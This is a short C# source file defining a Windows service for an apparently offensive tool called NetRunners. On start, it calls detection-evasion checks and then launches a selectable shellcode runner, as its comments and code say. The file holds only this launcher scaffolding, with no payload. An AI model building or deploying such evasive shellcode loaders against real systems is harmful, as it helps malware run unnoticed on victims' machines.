using System;
using System.ServiceProcess;

namespace NetRunners.Svc
{
    /// <summary>
    /// Service function, calls Heurisitic functions, and calls a runner of your choice.
    /// Retrieves Heuristic functions from Heuristics class and Runner functions from Runners class.
    /// Accepts one or no arguments at runtime. By default (no args specified), calls Runner function (Simple shellcode runner).
    /// </summary>
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // evasion
            NetRunners.Helpers.Helper.PerformChecks();
            // execution
            NetRunners.Helpers.Helper.SelectRunner();
        }
        protected override void OnStop()
        {
        }
    }
}
